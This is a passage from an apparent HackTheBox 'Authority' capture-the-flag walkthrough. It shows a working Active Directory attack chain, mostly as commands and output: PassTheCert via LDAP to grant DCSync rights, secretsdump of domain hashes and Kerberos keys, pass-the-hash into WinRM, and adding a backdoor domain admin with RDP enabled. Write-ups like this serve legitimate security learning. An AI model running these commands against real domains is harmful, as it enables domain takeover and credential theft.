Certipy v4.3.0 - by Oliver Lyak (ly4k)
[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
> 0
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

![image-20.png](/assets/img/Authority/image-20.png)

However, this produces a strange error - `KDC_ERR_PADATA_TYPE_NOSUPP`.


### PassTheCert - authenticating to LDAP instead of PKINIT
Attempting `PKINIT` with `Rubeus` produces the same error. It seems we can't request a `TGT` with this certificate (`.pfx`). Googling the error we find [this](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html){:target="_blank"} lovely article. 

It transpires this error is because "sometimes, Domain Controllers do not support `PKINIT`. This can occur because the Kerberos certificate \(which is used for PKINIT\) is expired \(expires after one year) or because their certificates do not have the `Smart Card Logon EKU`. Extended Key Usage (EKUs) are attributes on a certificate that define how a certificate can be used (e.g. client authentication, smart card logon, etc). This makes sense as we verify the EKU is not present when we enumerated with `certipy`: 

```shell
Extended Key Usage                  : Encrypting File System
                                      Secure Email
                                      Client Authentication
                                      Document Signing
                                      IP security IKE intermediate
                                      IP security use
                                      KDC Authentication
```
Therefore, we can't get a `TGT` from the certificate, as `PKINIT` is impossible. However, the article suggests we can get around this by using using `Schannel` authentication from a certificate which authenticates to LDAP in a technique dubbed `PassTheCert`. If we can authenticate to `LDAP` using our domain admin certificate, we can do simply give our existing user `svc_ldap` `DCSync` rights (replication privileges) over the domain. 

The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/){:target="_blank"} allows authenticating against an LDAP/S server to perform different attack actions. Makes sense for our account to be called `svc_ldap`! We can simply convert our certificate to work with the tool, then do pass-the-cert to give `svc_ldap` replication privileges!

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ certipy cert -pfx administrator_authority.pfx -nokey -out user.crt 
Certipy v4.3.0 - by Oliver Lyak (ly4k)
[*] Writing certificate and  to 'user.crt'

┌──(kali㉿kali)-[~/Desktop]
└─$ certipy cert -pfx administrator_authority.pfx -nocert -out user.key
Certipy v4.3.0 - by Oliver Lyak (ly4k)
[*] Writing private key to 'user.key'

┌──(kali㉿kali)-[~/Desktop]
└─$ python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.129.235.244 -target svc_ldap -elevate 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Granted user 'svc_ldap' DCSYNC rights!
```

![image-21.png](/assets/img/Authority/image-21.png)

### Performing a DCSync
With our new replication privileges, can simulate a domain controllers data replication using `secretsdump` to `DCSync` to extract all the user password hashes from the `NTDS.DIT` in the domain!

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-secretsdump svc_ldap:'lDaP_1n_th3_cle4r!'@authority.htb                              
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:5f2d84fb5e44ccaddb52c672b9578fcb:::
EvilComputer$:12101:aad3b435b51404eeaad3b435b51404ee:9281605cb954cea1f1c59e5f7e6587d4:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:ec22cd5a1be00cba22bdb085dc87b01d33fa7c6d75cb7433b1baf03d5e3d5e78
AUTHORITY$:aes128-cts-hmac-sha1-96:9eb68cf803ce5d245d71d0c3494f01c6
AUTHORITY$:des-cbc-md5:895d670dd3310bc2
EvilComputer$:aes256-cts-hmac-sha1-96:b31fdcbbe066a2a888de66e7297f0349a95b9770066057709c1973ddfae7c1ec
EvilComputer$:aes128-cts-hmac-sha1-96:c2c25aee692b9f156473ca25d36d746c
EvilComputer$:des-cbc-md5:3113f2ecea4ce385
[*] Cleaning up...
```

![image-22.png](/assets/img/Authority/image-22.png)

> Notice how we also see the credential material of `EvilComputer$` that we added to the domain!
{: .prompt-tip } 

Now we can simply pass the NTLM hash and connect via `WinRM` as administrator\!

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ evil-winrm -i authority.htb -u administrator -H 6961f422924da90a6928197429eea4ed
```

![image-6.png](/assets/img/Authority/image-6.png)

With `root.txt`, we have pwned the box\!

![image-5.png](/assets/img/Authority/image-5.png)

## Post exploitation 
### Explaining why KDC_ERR_PADATA_TYPE_NOSUPP was intended
After completing the box, I noticed many people in the HackTheBox discord were wondering if this PADATA 'error' was intended, or why we had to get around it using `pass-the-cert`. To explain why this appeared, in our `WinRM` shell add a new user `rootjack` to the `Domain Admins` and `Remote Desktop Users` group. We can then enable RDP to open `3389` and hop on the DC via the GUI. 

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> net user rootjack Password123! /add
*Evil-WinRM* PS C:\Users\Administrator\Documents> net localgroup Administrators rootjack /add
*Evil-WinRM* PS C:\Users\Administrator\Documents> net group "Domain Admins" rootjack /add
*Evil-WinRM* PS C:\Users\Administrator\Documents> net localgroup "Remote Desktop Users" rootjack /add
*Evil-WinRM* PS C:\Users\Administrator\Documents> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

┌──(kali㉿kali)-[~/Desktop]
└─$ xfreerdp /v:10.129.235.244 /u:rootjack /p:Password123! /dynamic-resolution +clipboard
```

If we load up `certmgr` we can see the DC's local certificates.

![image-36.png](/assets/img/Authority/image-36.png)

Remember [Microsoft explain](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771){:target="_blank"} our error is caused when a DC doesn't have a certificate installed for smart cards (Domain Controller or Domain Controller Authentication templates). If we inspect the only enrolled client authentication certificate we see indeed there is no smart card logon EKU `1.3.6.1.4.1.311.20.2.2`, which explains why `PKINIT` didn't work as the certificate can't be used for this. A failed `PKINIT` is an indication that the KDC does not have certificates with the necessary `EKU`, and we just proved that! 

![image-35.png](/assets/img/Authority/image-35.png)

To fix this as a Domain Admin we can simply just enroll a new Kerberos authentication certificate.

![image-33.png](/assets/img/Authority/image-33.png)

Taking a look at our new certificate we see it has the Smart Card Logon EKU.

![image-37.png](/assets/img/Authority/image-37.png)

And then as if by magic, `PKINIT` now works giving us a `TGT` from the certificate!

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ certipy auth -pfx administrator_authority.pfx -dc-ip 10.129.235.244 
Certipy v4.3.0 - by Oliver Lyak (ly4k)
[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
> 0
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@authority.htb': aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
```

![image-34.png](/assets/img/Authority/image-34.png)

I thought including this error deliberately was an awesome to learn a way to get around this error by authenticating to ldap. Definitely a cool trick to know - awesome box 😄 